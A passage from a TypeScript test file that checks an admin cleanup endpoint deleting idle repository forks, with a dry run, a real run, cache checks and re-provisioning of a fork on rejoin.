      const forks = (instance as unknown as { forks: Map<string, { lastSeenAt?: number }> }).forks;
      for (const [id, f] of forks) if (!id.startsWith('w-active')) f.lastSeenAt = Date.now() - 3 * 86_400_000;
    });
    const dry = await call('POST', `/api/repos/${repo}/cleanup`, ADMIN, { idleDays: 2, dryRun: true });
    expect(dry.body.forks).toMatchObject({ idle: 1, deleted: 0, kept: 2 });
    const real = await call('POST', `/api/repos/${repo}/cleanup`, ADMIN, { idleDays: 2 });
    expect(real.body.forks).toMatchObject({ idle: 1, deleted: 1, kept: 2 });
    expect(await forkRefs(repo, idleFork)).toBeNull();
    expect(await forkRefs(repo, busyFork)).not.toBeNull();
    const cached = await runInDurableObject(shardFor(repo, 'I1', 1), async (instance) => [...(instance as unknown as { forkCache: Map<string, unknown> }).forkCache.keys()]);
    expect(cached.some((k) => k.startsWith('w-idle'))).toBe(false);
    // Back after a pause: join provisions a fork again and claims work.
    expect((await call('POST', `/api/repos/${repo}/join`, idle)).status).toBe(200);
    expect(await forkRefs(repo, idleFork)).not.toBeNull();
  });
});
